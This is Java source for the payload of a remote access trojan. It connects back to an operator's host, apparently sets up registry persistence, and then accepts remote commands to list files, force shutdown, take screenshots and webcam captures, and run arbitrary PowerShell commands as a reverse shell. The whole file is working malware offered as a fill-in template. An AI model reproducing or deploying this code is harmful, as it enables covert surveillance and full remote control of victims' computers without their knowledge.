package rat;

import com.github.sarxos.webcam.Webcam;
import rat.commande.Shutdown;
import rat.commande.*;
import rat.registry.WinRegistry;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.file.Path;
import java.util.Scanner;

public class Payload {

    private Socket client,clientImage;
    private BufferedReader bR;
    private ObjectOutputStream oOS;
    private String cmd,cmdTerm,ip;
    private int port;
    private Path currentPath = new File("C:\\").toPath();
    private Process process;
    private Scanner sc;

    public Payload(String ip, int port){
        try {
            this.ip=ip;
            this.port=port;
            WinRegistry.checkReg();
            waitConnexion();

            do{
                try {
                    cmd = sc.nextLine();
                } catch (Exception e) {
                    waitConnexion();
                }
                    switch(cmd){
                        case "exit":
                            break;
                        case "lsroot":
                            send(LsRoot.getDisk());
                            break;
                        case "ls":
                            send(Ls.list(currentPath));
                            break;
                        case "shutdown":
                            send(Shutdown.shutdown());
                            Runtime.getRuntime().exec("shutdown -s -t 0");
                            break;
                        case "switch":
                            send("Change terminal");
                            changeTerm();
                            break;
                        case "ss":
                            sendImage(ScreenShot.printScreen());
                            break;
                        case "lsc":
                            send(Webcam.getWebcams().toString());
                            break;
                        case "sc":
                            sendImage(ScreenCam.printCam());
                            break;
                        default:
                            if (cmd.matches("^cd [A-Za-z0-9_./].*$")) // Change directory command
                                changeDirectory(cmd);
                     }
            }while(!cmd.equals("exit"));

            sc.close();
            connexionIsClose();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void changeTerm(){
        try {
            do{
                try {
                    cmdTerm = sc.nextLine();
                } catch (Exception e) {
                    waitConnexion();
                    break;
                }
                if (cmdTerm.matches("^cd [A-Za-z0-9_./].*$"))  // Change directory command
                    changeDirectory(cmdTerm);
                process = Runtime.getRuntime().exec("powershell.exe /c " + cmdTerm,null,new File(currentPath.toString()));
                BufferedReader bRTerm = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder sB = new StringBuilder();
                bRTerm.lines().forEach(l -> sB.append(l).append("\n"));
                if (!cmdTerm.matches("^cd [A-Za-z0-9_./].*$"))
                    send(sB.toString());
            }while(!cmdTerm.equals("exit"));
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void changeDirectory(String cmd){
        String retour;
        send(retour = Cd.changeDirectory(currentPath,cmd.substring(3)));

        if(retour.equals(currentPath.getRoot().toString()))
            currentPath = currentPath.getRoot();
        else if(!retour.equals("bad argument")) {
            if (currentPath.toString().equals(currentPath.getRoot().toString()))
                currentPath = new File(currentPath.toString() + cmd.substring(3)).toPath();
            else if(cmd.substring(3).equals(".."))
                currentPath = new File(currentPath.getParent().toString()).toPath();
            else
                currentPath = new File(currentPath.toString() + "\\" + cmd.substring(3)).toPath();
        }
    }

    private void send(Object result){
        try {
            oOS.writeObject(result);
            oOS.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendImage(BufferedImage image) throws IOException {
        clientImage = new Socket(InetAddress.getByName(this.ip),this.port-1);
        ImageIO.write(image, "jpg", clientImage.getOutputStream());
        clientImage.close();
    }

    private void waitConnexion() throws IOException, InterruptedException {
        connexion: while (true) {
        client = new Socket();
            try {
                client.connect(new InetSocketAddress(this.ip,this.port));
                connexionIsOpen();
                sc = new Scanner(bR);
                break connexion;
            } catch (IOException e) {
                e.printStackTrace();
            }
            client.close();
            Thread.sleep(3000);
        }
    }

    private void connexionIsOpen(){
        try {
            bR = new BufferedReader(new InputStreamReader(client.getInputStream()));
            oOS = new ObjectOutputStream(client.getOutputStream());
            oOS.writeObject(Inet4Address.getLocalHost().toString() +" "+ currentPath.toString());
            oOS.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void connexionIsClose(){
        try {
            oOS.flush();
            oOS.close();
            client.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        new Payload("AAAA",PPPP); //AAAA and PPPP parameters for the template
    }
}
